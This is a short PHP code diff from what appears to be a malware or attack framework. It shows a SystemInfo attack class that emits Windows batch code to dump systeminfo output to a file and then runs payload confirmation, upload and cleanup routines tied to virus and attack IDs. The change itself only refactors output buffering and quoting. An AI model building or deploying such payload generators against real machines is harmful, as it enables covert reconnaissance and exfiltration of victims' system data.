@@ -24,13 +24,12 @@ class SystemInfo extends AttackBase {
         $this->systemInfo = $systemInfo;
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         chCp 65001
-        systemInfo > %~pd0system
+        systemInfo > "%~pd0system"
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:on
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean();
     }
 
     private function generateUploadCode() {
